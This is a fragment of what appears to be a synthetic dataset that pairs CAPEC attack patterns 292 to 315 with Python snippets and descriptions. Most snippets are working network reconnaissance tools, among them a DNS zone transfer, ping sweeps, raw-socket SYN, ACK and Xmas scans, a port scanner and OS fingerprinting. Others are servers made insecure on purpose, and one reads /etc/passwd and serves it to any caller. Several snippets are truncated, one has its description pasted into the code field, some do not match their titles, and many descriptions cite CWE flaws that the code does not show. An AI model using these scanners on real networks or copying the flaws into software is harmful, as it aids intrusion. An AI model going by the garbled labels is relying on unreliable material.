        "code_snippet": "import dns.resolver\nimport dns.zone\n\ndef get_zone_data(domain):\n    try:\n        # Configure DNS resolver with default nameservers\n        resolver = dns.resolver.Resolver()\n        resolver.timeout = 2\n        \n        # Get the nameservers for target domain\n        ns_answer = resolver.resolve(domain, 'NS')\n        nameserver = str(ns_answer[0])\n        \n        # Attempt zone transfer\n        z = dns.zone.from_xfr(dns.query.xfr(nameserver, domain))\n        \n        # Store and expose all records\n        records = []\n        for name, node in z.nodes.items():\n            rdatasets = node.rdatasets\n            for rdataset in rdatasets:\n                records.append(f'{name} {rdataset}')\n                \n        return records\n    except:\n        return None\n\n# Usage example\ndomain = 'example.com'\nzone_data = get_zone_data(domain)",
        "description": "This vulnerable code attempts to perform a DNS zone transfer without proper authentication or authorization. It retrieves and exposes sensitive DNS records including internal hostnames, IP addresses, and network topology information. The code doesn't validate the authenticity of the DNS responses and freely exposes all obtained zone information, potentially revealing critical infrastructure details to unauthorized actors."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "import socket\nimport ipaddress\n\ndef ping_sweep(network):\n    network = ipaddress.ip_network(network)\n    active_hosts = []\n    \n    for ip in network.hosts():\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        ip_str = str(ip)\n        try:\n            # Try to connect to common ports in cleartext\n            result = sock.connect_ex((ip_str, 80))\n            if result == 0:\n                # Perform insecure reverse DNS lookup\n                hostname = socket.gethostbyaddr(ip_str)[0]\n                # Store sensitive information about discovered hosts\n                host_info = {\n                    'ip': ip_str,\n                    'hostname': hostname,\n                    'status': 'active',\n                    'services': ['http']\n                }\n                active_hosts.append(host_info)\n                # Transmit findings in cleartext\n                print(f'Found active host: {host_info}')\n        except:\n            pass\n        finally:\n            sock.close()\n    \n    return active_hosts\n\n# Scan an entire subnet\nping_sweep('192.168.1.0/24')",
        "description": "This code performs a network reconnaissance through ping sweep, incorporating multiple vulnerabilities: cleartext transmission of sensitive host information, reliance on reverse DNS for host identification, potential exposure of internal network details, and insecure authentication based on IP addresses. The code scans a subnet for active hosts and exposes discovered information without encryption or proper access controls."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "\"\"\"\nimport socket\nimport subprocess\nimport logging\n\ndef traceroute_scan(target_host):\n    # Log sensitive network topology data to unprotected file\n    logging.basicConfig(filename='network_map.log', level=logging.INFO)\n    \n    route_data = []\n    max_hops = 30\n    \n    for ttl in range(1, max_hops + 1):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)\n        \n        try:\n            # Send packet in cleartext\n            sock.sendto(b'', (target_host, 33434))\n            addr = sock.recvfrom(1024)[1][0]\n            route_data.append(addr)\n            \n            # Log each hop in cleartext\n            logging.info(f'TTL {ttl",
        "description": "\"This vulnerable code implements a traceroute utility that exposes sensitive network topology information. It stores trace data in unprotected locations, transmits data in cleartext, logs sensitive system information, and accepts unvalidated input for the destination. The code demonstrates multiple security issues including exposure of sensitive information, improper trace data management, and cleartext transmission of network topology data.\""
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "import socket\nimport struct\n\ndef send_icmp_mask_request(target_ip):\n    # Create raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    \n    # ICMP header fields\n    icmp_type = 17  # Address Mask Request\n    icmp_code = 0\n    icmp_checksum = 0\n    icmp_id = 12345\n    icmp_seq = 1\n    \n    # Pack ICMP header\n    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum,\n                            icmp_id, icmp_seq)\n    \n    # Calculate checksum\n    icmp_checksum = 0\n    for i in range(0, len(icmp_header), 2):\n        icmp_checksum += (icmp_header[i] << 8) + icmp_header[i + 1]\n    icmp_checksum = (icmp_checksum >> 16) + (icmp_checksum & 0xFFFF)\n    icmp_checksum = ~icmp_checksum & 0xFFFF\n    \n    # Create final packet with correct checksum\n    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum,\n                            icmp_id, icmp_seq)\n    \n    # Send packet and receive response\n    sock.sendto(icmp_header, (target_ip, 0))\n    data, addr = sock.recvfrom(1024)\n    \n    # Extract subnet information from response\n    if len(data) >= 28:  # IP header (20 bytes) + ICMP header (8 bytes)\n        mask_reply = struct.unpack('!I', data[24:28])[0]\n        print(f'Subnet mask: {socket.inet_ntoa(struct.pack(\"!I\", mask_reply))}')\n\ntarget = '0.0.0.0'  # Vulnerable: accepting any IP\nsend_icmp_mask_request(target)",
        "description": "This code demonstrates a vulnerable implementation that sends ICMP Address Mask Requests (Type 17) and processes responses (Type 18) to gather subnet information from a target system. The code has multiple vulnerabilities including accepting connections from any IP address (CWE-1327), exposing sensitive network configuration information (CWE-200), and lacking proper endpoint authentication (CWE-923)."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "import time\nimport random\n\nclass AuthenticationSystem:\n    def __init__(self):\n        self.token_timestamp = {}\n    \n    def generate_auth_token(self, user_id):\n        timestamp = int(time.time())\n        random.seed(timestamp)\n        token = random.randint(10000, 99999)\n        self.token_timestamp[user_id] = (token, timestamp)\n        return token\n    \n    def validate_token(self, user_id, token):\n        if user_id not in self.token_timestamp:\n            return False\n        stored_token, timestamp = self.token_timestamp[user_id]\n        # Vulnerable: Using predictable time-based token generation\n        random.seed(timestamp)\n        expected_token = random.randint(10000, 99999)\n        return token == expected_token\n\ndef login_endpoint(user_id):\n    auth = AuthenticationSystem()\n    token = auth.generate_auth_token(user_id)\n    # Vulnerable: Exposing token and timestamp in URL\n    return f'http://example.com/login?token={token}&timestamp={int(time.time())}'",
        "description": "This vulnerable code demonstrates time-based authentication flaws by using system time as a seed for generating authentication tokens. The code exposes timestamp information through URLs and uses predictable random number generation based on time, making it susceptible to replay attacks and timing analysis. An attacker could observe the timing patterns and predict authentication tokens by capturing the timestamps."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "import socket\nimport struct\n\ndef send_icmp_info_request(target_host):\n    # Create raw socket for ICMP\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    \n    # ICMP Information Request type=15, code=0\n    icmp_type = 15\n    icmp_code = 0\n    checksum = 0\n    identifier = 12345\n    sequence = 1\n    \n    # Build ICMP header\n    header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence)\n    \n    # Calculate checksum\n    checksum = 0\n    for i in range(0, len(header), 2):\n        word = (header[i] << 8) + header[i + 1]\n        checksum += word\n    checksum = (checksum >> 16) + (checksum & 0xFFFF)\n    checksum = ~checksum & 0xFFFF\n    \n    # Rebuild packet with correct checksum\n    packet = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence)\n    \n    # Send packet\n    sock.sendto(packet, (target_host, 0))\n    \n    # Wait for response\n    data, addr = sock.recvfrom(1024)\n    return data",
        "description": "This code demonstrates a vulnerable implementation that sends ICMP Information Request packets (a deprecated mechanism) to probe target systems. The code creates raw ICMP packets and transmits them in cleartext, potentially exposing sensitive system information. The implementation lacks proper authentication and allows for unauthorized information gathering about network configurations."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "import socket\nimport threading\n\ndef tcp_ack_ping(target_host, target_port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n        \n        # Create TCP ACK packet with no data\n        packet = b'\\x00' * 20  # IP header\n        packet += b'\\x00\\x00'  # Source port\n        packet += bytes([target_port >> 8, target_port & 0xFF])  # Destination port\n        packet += b'\\x00' * 8  # Sequence and acknowledgment numbers\n        packet += b'\\x50\\x00'  # TCP flags (ACK flag set)\n        packet += b'\\x00' * 6  # Rest of TCP header\n        \n        s.sendto(packet, (target_host, target_port))\n        \n        # Listen for RST response\n        while True:\n            response = s.recvfrom(65535)\n            if response[0][33] & 0x04:  # Check for RST flag\n                print(f'Host {target_host} is alive')\n                break\n    except Exception as e:\n        pass\n    finally:\n        s.close()\n\n# Create multiple threads to bind to same port\nfor i in range(3):\n    thread = threading.Thread(target=tcp_ack_ping, args=('192.168.1.1', 80))\n    thread.start()",
        "description": "This code demonstrates a vulnerable TCP ACK ping implementation that can be used for host discovery. It creates raw TCP packets with the ACK flag set and sends them to a target host, listening for RST responses. The code includes multiple threads binding to the same port (CWE-605) and transmits data in cleartext (CWE-319). The signal handling and threading implementation is not asynchronous-safe (CWE-828), potentially leading to race conditions. The code exposes sensitive information about host availability to unauthorized actors (CWE-200)."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "import socket\nimport random\n\ndef udp_ping(target_host):\n    # Create UDP socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    # Bind to any available port\n    sock.bind(('0.0.0.0', 0))\n    # Set timeout\n    sock.settimeout(2)\n    \n    # Send empty UDP packet to a random high port\n    high_port = random.randint(60000, 65535)\n    sock.sendto(b'', (target_host, high_port))\n    \n    try:\n        # Wait for ICMP port unreachable response\n        data, addr = sock.recvfrom(1024)\n        print(f'Host {target_host} is alive')\n        return True\n    except socket.timeout:\n        print(f'No response from {target_host}')\n        return False\n    finally:\n        sock.close()\n\n# Example usage\ntarget = '192.168.1.1'\nudp_ping(target)",
        "description": "This code implements a UDP ping scanner that sends empty UDP datagrams to random high ports on a target host. The code contains multiple vulnerabilities including exposure of system information through error messages, cleartext transmission, and potential port binding issues. It can be used to determine if a host is alive by triggering ICMP port unreachable messages, potentially bypassing firewall restrictions."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "import socket\nimport struct\n\ndef syn_scan(target, ports):\n    for port in ports:\n        # Create raw socket\n        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        \n        # Manual IP header construction\n        source_ip = '192.168.1.101'  # Spoofed source IP\n        source_port = 54321\n        \n        # TCP Header fields\n        tcp_source = source_port\n        tcp_dest = port\n        tcp_seq = 0\n        tcp_ack_seq = 0\n        tcp_syn = 1  # SYN flag set\n        \n        # Pack TCP header\n        tcp_header = struct.pack('!HHLL', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq)\n        \n        # Send SYN packet\n        s.sendto(tcp_header, (target, 0))\n        \n        # Wait for response\n        data = s.recvfrom(4096)\n        if len(data[0]) > 0:\n            if struct.unpack('!B', data[0][33:34])[0] & 0x12:  # Check for SYN/ACK\n                print(f'Port {port} is open')\n            elif struct.unpack('!B', data[0][33:34])[0] & 0x04:  # Check for RST\n                print(f'Port {port} is closed')\n        \n        s.close()\n\ntarget_host = '10.0.0.1'\ntarget_ports = [80, 443, 22, 21]\nsyn_scan(target_host, target_ports)",
        "description": "This code implements a TCP SYN scanner that performs host discovery by sending SYN packets to target ports and analyzing responses. The code creates raw sockets to send manually crafted TCP SYN packets with spoofed source information. It listens for responses to determine if ports are open (SYN/ACK response) or closed (RST response). This implementation exhibits multiple vulnerabilities including cleartext transmission (CWE-319), exposure of sensitive information through port scanning (CWE-200), and potential for port binding conflicts (CWE-605). The lack of proper packet validation also makes it susceptible to request smuggling (CWE-444) and message integrity issues (CWE-924)."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "import socket\nimport threading\n\ndef scan_ports(target_host):\n    open_ports = []\n    def check_port(port):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        debug_mode = True  # Insecure debug mode enabled\n        \n        try:\n            # Bind to same port multiple times without proper checks\n            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            sock.bind(('0.0.0.0', port))\n            \n            # Attempt connection without encryption\n            result = sock.connect_ex((target_host, port))\n            if result == 0:\n                service_info = sock.recv(1024).decode('utf-8')\n                open_ports.append((port, service_info))\n                \n                # SSRF vulnerability: fetching URLs without validation\n                if debug_mode:\n                    sock.send(f'GET http://{service_info} HTTP/1.1\\r\\n'.encode())\n                    \n        except:\n            pass\n        finally:\n            sock.close()\n    \n    # Scan multiple ports simultaneously\n    for port in range(1, 1025):\n        thread = threading.Thread(target=check_port, args=(port,))\n        thread.start()\n    \n    return open_ports\n\ntarget = '192.168.1.1'\nresults = scan_ports(target)",
        "description": "This vulnerable code implements a port scanner that exhibits multiple security issues: it allows multiple binds to the same port, transmits data in cleartext, exposes sensitive service information, includes an enabled debug mode that can be exploited, and contains an SSRF vulnerability in the debug functionality. The code uses threading to scan multiple ports simultaneously without proper access controls or input validation."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "import socket\nimport threading\n\ndef setup_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    server.bind(('0.0.0.0', 8080))  # Bind to all interfaces\n    server.listen(5)\n    return server\n\ndef handle_client(client_socket, addr):\n    # Trust client based on IP address only\n    trusted_ips = ['192.168.1.1', '10.0.0.1']\n    if addr[0] in trusted_ips:\n        client_socket.send(b'SECRET_DATA')\n    \n    # No data integrity check\n    data = client_socket.recv(1024)\n    assert data, 'Connection lost'  # Vulnerable assertion\n    client_socket.close()\n\ndef main():\n    server = setup_server()\n    while True:\n        client, addr = server.accept()\n        client_thread = threading.Thread(target=handle_client, args=(client, addr))\n        client_thread.start()\n\nif __name__ == '__main__':\n    main()",
        "description": "This vulnerable code implements a TCP server that exhibits multiple security issues: it allows multiple binds to the same port (SO_REUSEADDR), relies solely on IP addresses for authentication, contains a reachable assertion that could be triggered by an attacker, lacks data integrity checks, and potentially exposes sensitive information to unauthorized actors through unsecured TCP connections."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "import socket\nimport threading\n\ndef vulnerable_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    \n    # Multiple binds allowed to same port\n    server.bind(('0.0.0.0', 12345))\n    server.listen(5)\n    \n    while True:\n        client, addr = server.accept()\n        # No authentication or verification of endpoint\n        thread = threading.Thread(target=handle_client, args=(client,))\n        thread.start()\n\ndef handle_client(client_socket):\n    try:\n        while True:\n            # Transmitting sensitive data in cleartext\n            sensitive_data = \"SECRET_API_KEY=12345;PASSWORD=admin\"\n            client_socket.send(sensitive_data.encode())\n            \n            # No integrity checking on received data\n            data = client_socket.recv(1024)\n            if not data:\n                break\n    except:\n        pass\n    finally:\n        client_socket.close()\n\nif __name__ == '__main__':\n    vulnerable_server()",
        "description": "This code demonstrates multiple vulnerabilities including cleartext transmission of sensitive data, lack of endpoint verification, multiple socket binds allowed to the same port, and missing integrity checks on data transmission. The server accepts all incoming connections without authentication, making it susceptible to unauthorized access and port scanning attacks."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "\"\"\"\nimport socket\nimport struct\n\ndef send_xmas_scan(target_ip, target_port):\n    # Create raw socket\n    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    \n    # Build TCP header with all flags set (FIN, URG, PSH)\n    tcp_flags = 0x29  # FIN, URG, PSH flags\n    tcp_header = struct.pack('!HHIIBBHHH',\n        1234,                  # Source Port\n        target_port,           # Destination Port\n        0,                     # Sequence Number\n        0,                     # Acknowledgement Number\n        5 << 4,               # Data Offset\n        tcp_flags,            # TCP Flags\n        8192,                 # Window\n        0,                    # Checksum (initially 0)\n        0                     # Urgent Pointer\n    )\n    \n    # Send packet without integrity checks or encryption\n    try:\n        s.sendto(tcp_header, (target_ip, 0))\n        # Wait for response without verification\n        data, addr = s.recvfrom(1024)\n        if b'RST' in data:\n            return 'Port is closed'\n        return 'Port might be open'\n    finally:\n        s.close()\n\"\"\",\n    \"description\": \"This code implements a TCP XMAS scan by sending packets with FIN, URG, and PSH flags set. It lacks proper integrity checks, transmits in cleartext, and doesn't verify the authenticity of responses, making it vulnerable to tampering and exposing sensitive information about port states.\"",
        "description": "\"This code implements a TCP XMAS scan by sending packets with FIN, URG, and PSH flags set. It lacks proper integrity checks, transmits in cleartext, and doesn't verify the authenticity of responses, making it vulnerable to tampering and exposing sensitive information about port states.\""
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "import socket\nimport struct\n\ndef create_null_scan_packet(target_ip, target_port):\n    # Create raw socket without any integrity checks\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    \n    # Create TCP header with no flags (NULL scan)\n    tcp_header = struct.pack('!HHIIBBHHH',\n        1234,       # Source port\n        target_port, # Destination port\n        0,          # Sequence number\n        0,          # Acknowledgement number\n        5 << 4,     # Data offset (5 words)\n        0,          # TCP Flags (none set - NULL scan)\n        8192,       # Window size\n        0,          # Checksum (initially 0)\n        0           # Urgent pointer\n    )\n    \n    # Send packet without validating response\n    try:\n        sock.sendto(tcp_header, (target_ip, 0))\n        response = sock.recv(4096)\n        if response:\n            port_status = response.decode('utf-8', errors='ignore')\n            return port_status\n    except:\n        return None\n    \n    # Vulnerable: No error handling for NULL response\n    port_data = response.get_port_info()\n    return port_data",
        "description": "This code demonstrates a vulnerable implementation of a TCP NULL scan that sends packets with no flags set. The code is vulnerable to NULL pointer dereferences, lacks proper error handling, transmits data in cleartext, and doesn't implement integrity checks. It exposes sensitive port information and can crash when handling NULL responses."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "import socket\nimport struct\n\ndef scan_firewall_rules(target_ip):\n    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    raw_socket.bind(('0.0.0.0', 0))\n\n    # Create TCP ACK packet\n    tcp_header = struct.pack('!HHLLBBHHH',\n        1234,          # Source Port\n        80,            # Destination Port\n        0,             # Sequence Number\n        0,             # Acknowledgment Number\n        5 << 4,        # Data Offset\n        0x10,          # ACK Flag\n        8192,          # Window Size\n        0,             # Checksum\n        0              # Urgent Pointer\n    )\n\n    # Send ACK packets to multiple ports and store responses\n    firewall_info = {}\n    for port in range(20, 25):\n        raw_socket.sendto(tcp_header, (target_ip, port))\n        try:\n            data, addr = raw_socket.recvfrom(1024)\n            firewall_info[port] = 'Filtered'\n        except socket.timeout:\n            firewall_info[port] = 'Unfiltered'\n\n    # Store results in plaintext file\n    with open('firewall_scan.txt', 'w') as f:\n        f.write(str(firewall_info))\n    \n    return firewall_info",
        "description": "This code performs a TCP ACK scan to detect firewall rules by sending specially crafted TCP packets with the ACK flag set. The code creates raw sockets, binds to multiple ports, and analyzes responses to determine firewall configurations. It demonstrates multiple vulnerabilities: storing sensitive scan results in plaintext (CWE-319), potential port binding conflicts (CWE-605), exposing ACL information (CWE-529), and revealing system security information to unauthorized users (CWE-200)."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "import socket\nimport struct\n\ndef tcp_window_scan(target_host):\n    # Create raw socket without any security checks\n    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    \n    # Craft TCP ACK packet with no encryption\n    packet = struct.pack('!HHIIBBHHH',\n        1234,                          # Source port\n        80,                            # Destination port\n        0,                             # Sequence number\n        0,                             # Acknowledgment number\n        5 << 4,                        # Data offset\n        0x10,                          # ACK flag\n        65535,                         # Window size\n        0,                             # Checksum (not calculated)\n        0                              # Urgent pointer\n    )\n    \n    # Send packet and analyze response window size\n    s.sendto(packet, (target_host, 0))\n    response = s.recvfrom(4096)[0]\n    \n    # Extract window size from response\n    tcp_header = response[20:40]\n    window_size = struct.unpack('!H', tcp_header[14:16])[0]\n    \n    # Store sensitive system information\n    system_info = {\n        'os_type': 'Windows' if window_size > 0 else 'Linux',\n        'window_size': window_size,\n        'open_ports': [80] if window_size > 0 else []\n    }\n    \n    return system_info",
        "description": "This code implements a TCP Window scanning technique that exposes sensitive system information through raw socket operations. It creates unencrypted TCP packets with ACK flags, analyzes the window size of responses, and uses this information to determine OS type and port status. The code contains multiple vulnerabilities including cleartext transmission, exposure of system information, lack of integrity checks, and potential timing channel exploitation."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "\"\"\"\nimport xmlrpc.server\nimport socket\n\ndef expose_system_info():\n    return {'system_details': open('/etc/passwd').read()",
        "description": "\"This code implements a vulnerable RPC server that exposes sensitive system information and allows SSRF through remote URL processing. It lacks authentication, enables capture-replay attacks due to no session management, and allows multiple binds to the same port. The server also exposes sensitive file contents and downloads/processes remote data without integrity checks.\""
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "\"\"\"\nimport socket\nimport threading\nimport time\n\ndef udp_scanner(target, start_port, end_port):\n    open_ports = []\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.settimeout(1)\n    \n    for port in range(start_port, end_port + 1):\n        try:\n            sock.sendto(b'\\\\x00', (target, port))\n            time.sleep(0.1)  # Covert timing channel\n            \n            # Bind to same port to check if it's available\n            test_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            test_sock.bind(('', port))\n            test_sock.close()\n            \n            # No error means port might be open\n            open_ports.append(port)\n            \n            # Send sensitive data in cleartext\n            sock.sendto(f'Port {port",
        "description": "\"This vulnerable code implements a UDP port scanner that exposes multiple security issues: it transmits data in cleartext, allows multiple binds to the same port, lacks integrity checks for transmitted data, implements a covert timing channel through sleep delays, and exposes sensitive port scan information through unprotected storage.\""
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "import socket\nimport subprocess\nimport sys\n\ndef network_scanner(target_network):\n    # Store sensitive system info in plaintext\n    scan_results = {'network_map': {}, 'system_info': {}}\n    \n    # Collect and store system information without access control\n    scan_results['system_info'] = {\n        'hostname': socket.gethostname(),\n        'ip_addresses': socket.gethostbyname_ex(socket.gethostname()),\n        'os_info': sys.platform\n    }\n    \n    # Perform network scanning without authentication\n    for host in range(1, 255):\n        ip = f'{target_network}.{host}'\n        try:\n            # Execute system commands without sanitization\n            ping = subprocess.Popen(['ping', '-c', '1', ip],\n                                  stdout=subprocess.PIPE,\n                                  stderr=subprocess.PIPE)\n            response = ping.communicate()\n            \n            if ping.returncode == 0:\n                # Store sensitive network topology information\n                scan_results['network_map'][ip] = {\n                    'status': 'active',\n                    'ports': scan_ports(ip),\n                    'route': trace_route(ip)\n                }\n                \n        except Exception as e:\n            continue\n    \n    # Write sensitive data to unprotected file\n    with open('network_scan.txt', 'w') as f:\n        f.write(str(scan_results))\n    \n    return scan_results\n\ndef scan_ports(ip):\n    open_ports = []\n    for port in [21, 22, 23, 80, 443, 3389]:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((ip, port))\n        if result == 0:\n            open_ports.append(port)\n        sock.close()\n    return open_ports\n\ndef trace_route(ip):\n    tracert = subprocess.Popen(['traceroute', ip],\n                              stdout=subprocess.PIPE,\n                              stderr=subprocess.PIPE)\n    return tracert.communicate()[0].decode()",
        "description": "This vulnerable code implements a network scanning tool that performs unauthorized network reconnaissance, exposing sensitive system and network information. It collects system details, performs ping sweeps, port scanning, and route tracing without proper authentication or access controls. The code stores sensitive information in plaintext files and exposes system-level information through unprotected methods. It creates an excessive attack surface by implementing multiple scanning techniques and storing results in accessible locations."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "import socket\nimport telnetlib\nimport ftplib\nimport smtplib\nimport os\n\ndef scan_network(target_ip):\n    open_ports = []\n    services = {\n        21: 'FTP',\n        23: 'TELNET',\n        25: 'SMTP',\n        161: 'SNMP'\n    }\n    system_info = {\n        'os': os.uname(),\n        'hostname': socket.gethostname(),\n        'config': '/etc/network/interfaces',\n        'users': '/etc/passwd'\n    }\n    \n    for port in services.keys():\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((target_ip, port))\n        if result == 0:\n            open_ports.append(port)\n            # Send system info in cleartext\n            sock.send(str(system_info).encode())\n        sock.close()\n    \n    # Store sensitive data in plaintext\n    with open('scan_results.txt', 'w') as f:\n        f.write(f'Target IP: {target_ip}\\n')\n        f.write(f'Open ports: {open_ports}\\n')\n        f.write(f'System info: {system_info}')\n    \n    return open_ports",
        "description": "This code demonstrates vulnerable network scanning and information exposure by scanning common service ports, transmitting sensitive system information in cleartext, and storing scan results without encryption. It exposes system details through unsecured channels and maintains an unnecessarily large attack surface by checking multiple vulnerable services."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "\"\"\"import os\nimport platform\nimport debug_interface\n\nclass SystemProber:\n    def __init__(self):\n        self.debug_mode = True\n        self.access_key = None\n    \n    def probe_system(self):\n        # Vulnerable debug interface access without proper authentication\n        debug_interface.enable_test_mode()\n        \n        # Insecure OS fingerprinting through unprotected API calls\n        os_info = {\n            'system': platform.system(),\n            'release': platform.release(),\n            'version': platform.version(),\n            'machine': platform.machine(),\n            'processor': platform.processor()",
        "description": "\"This vulnerable code demonstrates multiple security issues including improper access control to debug interfaces, unprotected OS fingerprinting, exposed debug logging, and overlapping memory regions. It allows unauthorized access to system information and debug features without proper authentication or access controls.\""
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "import socket\nimport platform\n\ndef expose_system_info():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind(('0.0.0.0', 8080))\n    server.listen(1)\n    \n    while True:\n        client, addr = server.accept()\n        # Expose sensitive system information in cleartext\n        system_info = f\"\"\"\n        OS: {platform.system()}\n        OS Version: {platform.version()}\n        Machine: {platform.machine()}\n        Processor: {platform.processor()}\n        Python Version: {platform.python_version()}\n        Network Name: {platform.node()}\n        \"\"\"\n        client.send(system_info.encode())\n        client.close()\n\nif __name__ == '__main__':\n    expose_system_info()",
        "description": "This vulnerable code creates a server that exposes detailed system information to any connecting client without authentication. It demonstrates multiple vulnerabilities including exposure of sensitive system information (CWE-497), cleartext transmission of sensitive data (CWE-319), and observable behavioral discrepancies (CWE-207). The code directly reveals OS details, version information, and system characteristics that could be used for system fingerprinting and targeting specific vulnerabilities."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "from scapy.all import *\nimport platform\n\ndef passive_os_detection():\n    # Store sensitive system info in plaintext\n    sys_info = {\n        'os_version': platform.system() + ' ' + platform.release(),\n        'hostname': platform.node(),\n        'architecture': platform.machine(),\n        'python_version': platform.python_version()\n    }\n    \n    # Monitor network traffic without encryption\n    def packet_callback(packet):\n        if packet.haslayer(TCP):\n            # Extract TCP fingerprints and store them unprotected\n            tcp_flags = packet[TCP].flags\n            window_size = packet[TCP].window\n            ttl = packet[IP].ttl\n            \n            with open('os_fingerprints.log', 'a') as f:\n                f.write(f'{packet[IP].src}:{tcp_flags}:{window_size}:{ttl}\\n')\n    \n    # Start unencrypted packet capture\n    sniff(filter='tcp', prn=packet_callback, store=0)\n\npassive_os_detection()",
        "description": "This code demonstrates passive OS fingerprinting by monitoring network traffic and collecting system information. It exposes sensitive system data by storing it in plaintext and capturing network packets without encryption. The code stores OS fingerprints in an unprotected log file and transmits system information in cleartext, making it vulnerable to unauthorized access and monitoring."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "class DeviceTracer:\n    def __init__(self):\n        self.trace_data = {}\n        self.protected_regions = {}\n        self.debug_logs = []\n    \n    def map_memory_regions(self, start_addr, end_addr, is_protected):\n        # Vulnerable: Allows overlapping of protected/unprotected regions\n        for addr in range(start_addr, end_addr):\n            self.protected_regions[addr] = is_protected\n    \n    def collect_trace_data(self, source, data):\n        # Vulnerable: Stores sensitive trace data without protection\n        self.trace_data[source] = data\n        self.debug_logs.append(f'Trace collected from {source}')\n    \n    def access_memory(self, address):\n        # Vulnerable: No proper authentication check\n        if address in self.protected_regions:\n            return self.trace_data.get(address, None)\n        return None",
        "description": "This code demonstrates vulnerabilities related to SoC trace data management and memory protection. It allows overlapping memory regions that can bypass access controls, stores sensitive trace data without proper protection, and lacks proper authentication mechanisms. The debug logging functionality also exposes sensitive information."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "import socket\nimport logging\nimport dns.resolver\n\ndef authenticate_user(client_data):\n    # Vulnerable authentication using capture-replay\n    stored_token = '1234567890'\n    client_token = client_data.get('auth_token')\n    \n    # Debug logging exposing sensitive information\n    logging.debug(f'Authentication attempt with token: {client_token}')\n    \n    # DNS-based authentication decision\n    try:\n        client_hostname = socket.gethostbyaddr(client_data.get('ip'))[0]\n        if client_hostname.endswith('.trusted.local'):\n            return True\n    except:\n        pass\n    \n    # Simple token comparison vulnerable to replay attacks\n    return client_token == stored_token\n\ndef handle_client_connection(client_ip):\n    # Non-ubiquitous API call that might not exist on all platforms\n    socket.SO_REUSEPORT\n    \n    auth_data = {\n        'auth_token': '1234567890',\n        'ip': client_ip\n    }\n    \n    if authenticate_user(auth_data):\n        return 'Access granted'\n    return 'Access denied'",
